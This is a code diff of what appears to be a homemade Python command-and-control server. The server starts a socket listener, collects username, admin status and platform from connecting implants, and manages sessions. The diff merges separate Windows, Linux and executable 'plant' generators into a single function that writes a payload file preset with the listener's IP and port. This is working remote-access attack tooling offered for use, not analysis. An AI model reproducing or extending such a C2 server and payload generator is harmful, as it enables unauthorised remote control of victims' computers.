@@ -32,7 +32,7 @@ def outbound_message(remote_target, message):
 def listener_handler():
     sock.bind((host_ip, int(host_port)))
     print(
-        f'[*] Started listener on {host_ip}:{host_port}...\n')
+        f'[*] Started listener on {host_ip} port {host_port}...\n')
     sock.listen()
     t1 = threading.Thread(target=message_handler)
     t1.start()
@@ -45,11 +45,8 @@ def message_handler():
         try:
             remote_target, remote_ip = sock.accept()
             username = remote_target.recv(1024).decode()
-            print('username received - ', username)
             admin = remote_target.recv(1024).decode()
-            print('admin value received - ', admin)
             platform = remote_target.recv(1024).decode()
-            print('platform value received - ', platform)
             if admin == '1':
                 isAdmin = 'Yes'
             elif username == 'root':
@@ -102,26 +99,7 @@ def generate_random_string(length):
     return random_string
 
 
-def winplant():
-    name_generator = generate_random_string(6)
-    # file_name = f'{name_generator}.py'
-    file_name = 'winpayload.py'
-    check_pwd = os.getcwd()
-    if platform.system() == 'Windows':
-        if os.path.exists(f'{check_pwd}\\winclient.py'):
-            shutil.copy('winclient.py', file_name)
-        else:
-            print('[-] winclient.py file not found')
-    else:
-        if os.path.exists(f'{check_pwd}/winclient.py'):
-            shutil.copy('winclient.py', file_name)
-        else:
-            print('[-] winclient.py file not found')
-
-    print(file_name)
-
-
-def linplant():
+def generate_payload():
     name_generator = generate_random_string(6)
     # file_name = f'{name_generator}.py'
     file_name = 'payload.py'
@@ -138,7 +116,7 @@ def linplant():
             print('[-] client.py file not found')
 
     replacements = {"INPUT_IP_HERE": host_ip,
-                    "INPUT_PORT_HERE": host_port}
+                    "2222 # INPUT_PORT_HERE": host_port}
     with open(file_name, 'r') as file:
         file_content = file.read()
     for old_string, new_string in replacements.items():
@@ -146,7 +124,8 @@ def linplant():
     with open(file_name, 'w') as f:
         f.write(file_content)
 
-    print(file_name)
+    print(
+        f'Python payload for host {host_ip}:{host_port} saved as {file_name}')
 
 
 def exeplant():
@@ -165,8 +144,9 @@ if __name__ == '__main__':
         try:
             command = input('Enter command#> ')
             if command == 'start listener':
-                host_ip = input('[*] Enter LHOST IP: ')
-                host_port = input('[*] Enter LPORT to listen on: ')
+                host_ip = input(
+                    '[*] Enter Local Host IP: ')
+                host_port = input('[*] Enter Local Port to listen on: ')
                 listener_handler()
                 listener_counter += 1
             if command.split(' ')[0] == 'sessions':
@@ -190,23 +170,9 @@ if __name__ == '__main__':
                 sock.close()
                 break
 
-            if command == 'winplant':
+            if command == 'generate payload':
                 if listener_counter > 0:
-                    winplant()
-                else:
-                    print(
-                        '[-] You cannot generate a payload without an active listener.')
-
-            if command == 'linplant':
-                if listener_counter > 0:
-                    linplant()
-                else:
-                    print(
-                        '[-] You cannot generate a payload without an active listener.')
-
-            if command == 'exeplant':
-                if listener_counter > 0:
-                    exeplant()
+                    generate_payload()
                 else:
                     print(
                         '[-] You cannot generate a payload without an active listener.')
